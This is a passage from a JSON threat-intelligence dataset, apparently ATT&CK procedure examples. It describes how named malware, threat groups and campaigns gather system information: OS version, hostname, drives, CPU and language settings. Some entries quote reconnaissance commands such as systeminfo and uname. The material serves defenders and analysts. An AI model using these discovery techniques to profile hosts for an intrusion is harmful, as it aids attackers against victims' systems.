OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can obtain the computer name from the victim's system."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has collected the computer name from the infected host."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host."}, {"id": "S0171", "name": "Felismus", "description": "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT collects the victim\u2019s computer name, processor architecture, OS version, volume serial number, and system type."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has collected local host information by utilizing Windows commands systeminfo, fsutil, and fsinfo. FIN13 has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy obtains victim Microsoft Windows version information and CPU architecture."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher checks if the victim OS is 32 or 64-bit."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect the victim's operating system and computer name during the initial infection."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to obtain the compromised machine's name."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can enumerate all logical drives on a targeted machine."}, {"id": "C0007", "name": "FunnyDream", "description": "During FunnyDream, the threat actors used Systeminfo to collect information on targeted hosts."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has used the command ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\" to determine which Linux OS version is running."}, {"id": "G0047", "name": "Gamaredon Group", "description": "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture."}, {"id": "S0460", "name": "Get2", "description": "Get2 has the ability to identify the computer name and Windows version of an infected host."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon collects endpoint information using the systeminfo command."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has gathered operating system information."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can inspect the User-Agent string in GET request header information to determine the operating system of targeted systems."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can collect the computer name and OS version from a compromised host."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT collects the MAC address, computer name, and CPU information."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use uname to identify the operating system name, version, and processor type."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation ."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can collect the OS, and build version on a compromised host."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can obtain information about the OS, processor, and BIOS."}, {"id": "S0214", "name": "HAPPYWORK", "description": "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL can collect the OS version, architecture information, and computer name."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY can enumerate logical drives on a target system."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can determine the OS version, bitness, and enumerate physical drives on a targeted host."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has collected the hostname of a compromised machine."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can enumerate drives on a compromised host."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa collected the system volume serial number, GUID, and computer name."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has collected the host's OS, CPU, and memory information."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has been observed collecting victim machine information like OS version, volume information, and more."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has the ability to identify the computer name and OS version on a compromised host."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader uses WMI queries to gather information about the victim machine."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can discover and mount hidden drives to encrypt them."}, {"id": "G0100", "name": "Inception", "description": "Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer collects the victim machine\u2019s Windows GUID."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT gathers volume drive information and system information."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe collects the computer name of the victim's system during the initial infection."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can obtain system information such as OS version and disk space."}, {"id": "S0283", "name": "jRAT", "description": "jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor."}, {"id": "S0215", "name": "KARAE", "description": "KARAE can collect system information."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to obtain a victim's system name and operating system version."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar gathers information on the system and local drives."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has collected the system architecture, OS version, and MAC address information."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can enumerate the OS version and hostname of a targeted machine."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy can gather extended system information, such as information about the operating system, disks, and memory."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can collect drive information from a compromised host."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\\PHYSICALDRIVE0 API."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can obtain the OS version and build, computer name, and processor architecture from a compromised host."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can record the hostname and kernel version of the target machine."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has checked the OS version using wmic.exe and the find command."}, {"id": "S0156", "name": "KOMPROGO", "description": "KOMPROGO is capable of retrieving information about the infected system."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim\u2019s machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK can discover logical drive information on compromised hosts."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can gather operating system information."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron gathers the victim computer name using the Win32 API call GetComputerName."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can retrieve system information."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can enumerate the CPUID and BIOS version on a compromised system."}, {"id": "S0680", "name": "LitePower", "description": "LitePower has the ability to list local drives and enumerate the OS architecture."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can check the type of Ivanti VPN device it is running on by executing first_run() to identify the first four bytes of the motherboard serial number."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can collect the computer name from the machine,."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to discover the computer name and Windows product name/version."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner has monitored CPU usage."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can capture environmental variables on compromised hosts."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can use WMI queries and shell commands such as systeminfo.exe to collect the operating system, BIOS version, and domain name of the targeted system."}, {"id": "S0409", "name": "Machete", "description": "Machete collects the hostname of the target computer."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes."}, {"id": "S1048", "name": "macOS.OSAMiner", "description": "macOS.OSAMiner can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility df."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can collect the computer name and enumerate all drives on a compromised host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro collects the machine information, system architecture, the OS version, computer name, and Windows product name."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka performs basic system profiling actions to fingerprint and register the victim system with the C2 controller."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can obtain the computer name from a compromised host."}, {"id": "S0449", "name": "Maze", "description": "Maze has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can collect the computer name from a compromised host."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has collected the hostname and operating system version from the compromised host."}, {"id": "S0688", "name": "Meteor", "description": "Meteor has the ability to discover the hostname of a compromised host."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia gathers the hostname and OS version from the victim\u2019s machine."}, {"id": "S1015", "name": "Milan", "description": "Milan can enumerate the targeted machine's name and GUID."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can gather the hostname on a compromised machine."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox can collect CPU and architecture information from the victim\u2019s machine."}, {"id": "S0084", "name": "Mis-Type", "description": "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim."}, {"id": "S0083", "name": "Misdat", "description": "The initial beacon packet for Misdat contains the operating system version of the victim."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu collects the OS version, computer name, and language ID."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can collect information about the about the system."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can identify drives on compromised hosts and retrieve the hostname via gethostbyname."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has gathered information on victim systems."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has the capability to gather the OS version and computer name."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff collected information about the infected host, including the machine names and OS architecture."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that can collect the victim\u2019s OS version and machine name."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to retrieve information about the OS."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has gathered system information using systeminfo."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has used implants to perform system reconnaissance on targeted systems."}, {"id": "S0205", "name": "Naid", "description": "Naid collects a unique identifier (UID) from a compromised host."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu can gather the victim computer name and serial number."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT uses systeminfo on a victim\u2019s machine."}, {"id": "S0272", "name": "NDiskMonitor", "description": "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can discover logical drive information including the drive type, free space, and volume information."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can collect the OS version and computer name from a compromised host."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can determine the system architecture it is running on to choose which version of the DLL to use."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can discover and collect victim system information."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor gathers information on the victim system such as CPU and Computer name as well as device drivers. Nightdoor can also collect information about disk drives, their total and free space, and file system type."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can obtain the computer name and information on the OS and physical drives from targeted hosts."}, {"id": "S0385", "name": "njRAT", "description": "njRAT enumerates the victim operating system and computer name during the initial infection."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse conducts multiple system checks and includes these in subsequent \"heartbeat\" messages to the malware's command and control server."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can gather information on drives and the operating system on the victim\u2019s machine."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can collect the computer name from the system."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has run hostname and systeminfo on a victim."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can collect computer name, locale information, and information about the OS and architecture."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used the systeminfo command to gather details about a compromised system."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors collected the computer name, OS, and other system information using cmd /c systeminfo > %temp%\\ temp.ini."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network."}, {"id": "S0229", "name": "Orz", "description": "Orz can gather the victim OS version and whether it is 64 or 32 bit."}, {"id": "S0165", "name": "OSInfo", "description": "OSInfo discovers information about the infected machine."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has collected the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the ioreg command to gather some of this information."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key has the ability to gather the hostname of the victim machine."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can report the file system type and disk space of a compromised host to C2."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot performs a variety of system checks and gathers system information, including commands such as whoami."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke gathers system configuration information."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can retrieve the hostname of a compromised host."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can collect and send OS version and computer name as a part of its C2 beacon."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader has a command to collect victim system information, including the system name and OS version."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE collects general system enumeration data about the infected machine and checks the OS version."}, {"id": "G1040", "name": "Play", "description": "Play has leveraged tools to enumerate system information."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to gather information about the compromised host."}, {"id": "S0453", "name": "Pony", "description": "Pony has collected the Service Pack, language, and region information to send to the C2."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM can identify system information, including battery status."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains modules, such as Get-ComputerInfo, for enumerating common system information."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has collected system information on the infected host."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect information about the system by running hostname and systeminfo on a victim."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can gather system information such as computer names."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can grab a system\u2019s information including the OS version, architecture, etc."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can collect system information including the OS version and domain on a compromised host."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can gather system information from the victim\u2019s machine including the OS type."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer gathers information on infected systems such as operating system, processor information, RAM, and display information."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin performs several system checks as part of anti-analysis mechanisms, including querying the operating system build number, processor vendor and type, video controller, and CPU temperature."}, {"id": "S0241", "name": "RATANKBA", "description": "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can gather system information from a compromised host."}, {"id": "S0172", "name": "Reaver", "description": "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected information about the target system, such as system information and list of network connections."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT collects the CPU information, OS information, and system language."}, {"id": "S0496", "name": "REvil", "description": "REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has the ability to identify the Windows version on the compromised host."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can enumerate logical drives on targeted devices."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used uname -m to collect the name and information about the infected system's kernel."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can gather the hostname and the OS version to ensure it doesn\u2019t run on a Windows XP or Windows Server 2003 systems."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro executes a set of commands to collect device information, including uname.  Another example is the cat /etc/*release | uniq command used to collect the current OS distribution."}, {"id": "S1073", "name": "Royal", "description": "Royal can use GetNativeSystemInfo and GetLogicalDrives to enumerate system processors and logical drives."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain the computer name, OS version, and default language identifier."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT gathers the OS version, logical drives information, processor information, and volume information."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has called GetLogicalDrives to emumerate all mounted drives, and GetDriveTypeW to determine the drive type."}, {"id": "S0085", "name": "S-Type", "description": "The initial beacon packet for S-Type contains the operating system version and file system of the victim."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can identify the OS version, CPU, and other details from a victim's machine."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team used a backdoor to enumerate information about the infected system's operating system."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to collect the computer name, CPU manufacturer name, and C:\\ drive serial number from a compromised machine. Sardonic also has the ability to execute the ver and systeminfo commands."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to identify the OS version, OS bit information and computer name."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper will attempt to enumerate Windows version and system architecture."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server."}, {"id": "S1019", "name": "Shark", "description": "Shark can collect the GUID of a targeted machine."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can use a plugin to enumerate system drives."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has checked the system settings to see if Arabic is the configured language."}, {"id": "S0450", "name": "SHARPSTATS", "description": "SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter gathered the operating system name and specific Windows version of an infected machine."}, {"id": "S0217", "name": "SHUTTERSPEED", "description": "SHUTTERSPEED can collect system information."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has identified the OS version of a compromised host."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can collect the computer name of a targeted system."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can collect information related to a compromised host, including OS version and a list of drives."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to check whether the infected system\u2019s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine."}, {"id": "S0218", "name": "SLOWDRIFT", "description": "SLOWDRIFT collects and sends system information to its C2."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used the systeminfo command on a compromised host."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has the ability to query Win32_ComputerSystem for system information. "}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has the ability to enumerate system information including the victim computer name."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can enumerate the host name and OS version on a target system."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute getinfo to enumerate the computer name and OS version of a compromised system."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo."}, {"id": "S0157", "name": "SOUNDBITE", "description": "SOUNDBITE is capable of gathering system information."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug obtained OS version and hardware configuration from a victim."}, {"id": "S0543", "name": "Spark", "description": "Spark can collect the hostname, keyboard layout, and language from the system."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses the cat /proc/cpuinfo | grep -c \"cpu family\" 2>&1 command to gather system information. "}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can identify the system name of a compromised host."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has gathered victim computer information and configurations."}, {"id": "S0058", "name": "SslMM", "description": "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can gather the computer name of an infected host."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has the capability to discover the system OS, Windows version, architecture and environment."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to enumerate system information."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can collect the OS version, architecture, and machine name to create a unique token for the infected host."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can identify the hard disk volume serial number on a compromised host."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet collects system information including computer and domain names, OS version, and S7P paths."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST collected hostname and OS version."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use of systeminfo.exe."}, {"id": "S0242", "name": "SynAck", "description": "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2."}, {"id": "S0464", "name": "SYSCON", "description": "SYSCON has the ability to use Systeminfo to identify system information."}, {"id": "S0096", "name": "Systeminfo", "description": "Systeminfo can be used to gather information about the operating system."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can collect a system's architecture, operating system version, hostname, and drive information."}, {"id": "S0098", "name": "T9000", "description": "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has collected system information prior to downloading malware on the targeted host."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can use DriveList to retrieve drive information."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can collect system profile information from a compromised host."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has collected information on bootable drives including model, vendor, and serial numbers."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can use GetlogicalDrives to get a bitmask of all drives available on a compromised system. It can also use GetDriveType to determine if a new drive is a CD-ROM drive."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim\u2019s machine."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has detected a target system\u2019s OS version and system volume information."}, {"id": "S0647", "name": "Turian", "description": "Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of gathering system information."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can gather the disk volume information."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has the capability to gather the system\u2019s hostname and OS version."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has the ability to gather basic system information and run the POSIX API gethostbyname."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Systeminfo to gather system information."}, {"id": "S0476", "name": "Valak", "description": "Valak can determine the Windows version and computer 